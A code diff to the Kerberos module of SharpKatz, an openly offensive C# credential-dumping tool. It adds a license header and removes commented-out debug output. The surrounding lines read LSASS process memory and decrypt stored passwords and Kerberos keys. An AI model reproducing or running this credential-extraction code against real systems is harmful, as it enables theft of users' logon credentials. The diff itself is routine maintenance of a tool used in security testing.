@@ -1,4 +1,10 @@
-﻿using SharpKatz.Credential;
+﻿//
+// Author: B4rtik (@b4rtik)
+// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
+// License: BSD 3-Clause
+//
+
+using SharpKatz.Credential;
 using SharpKatz.Crypto;
 using System;
 using System.Collections.Generic;
@@ -325,8 +331,6 @@ namespace SharpKatz.Module
         {
             IntPtr kerbUnloadLogonSessionTableAddr;
             kerbUnloadLogonSessionTableAddr = Utility.GetListAdress(hLsass, msvMem, "kerberos.dll", max_search_size, oshelper.KerbUnloadLogonSessionTableOffset, oshelper.KerbUnloadLogonSessionTableSign);
-            
-            //Console.WriteLine("[*] Kerberos UnloadLogonSessionTable found at address {0:X}", kerbUnloadLogonSessionTableAddr.ToInt64());
 
             GetKerberosLogonList(ref hLsass, kerbUnloadLogonSessionTableAddr, oshelper, iv, aeskey, deskey, logonlist);
 
@@ -393,13 +397,6 @@ namespace SharpKatz.Module
                 passDecrypted = Utility.PrintHexBytes(msvDecryptedPasswordBytes);
             }
 
-            /*Console.WriteLine("sizeof(UNICODE_STRING) " + sizeof(UNICODE_STRING));
-            Console.WriteLine("LUID " + luid.LowPart);
-             Console.WriteLine("Uusername {0}", username);
-             Console.WriteLine("Udomain {0}", domain);
-            Console.WriteLine("Password type {0}", krbrLogonSession.credentials.type);
-            Console.WriteLine("Upassword {0}", password);
-            Console.WriteLine("Uusername {0} {1}", !string.IsNullOrEmpty(username), username.Length > 1);*/
             if (!string.IsNullOrEmpty(username) && username.Length > 1)
             {
 
@@ -459,7 +456,6 @@ namespace SharpKatz.Module
             if (pKeyList == null)
                 return;
 
-            //Console.WriteLine("[*] Kerberos  KeyList found at address {0:X}", pKeyList.ToInt64());
             LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSession, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
 
             byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))));
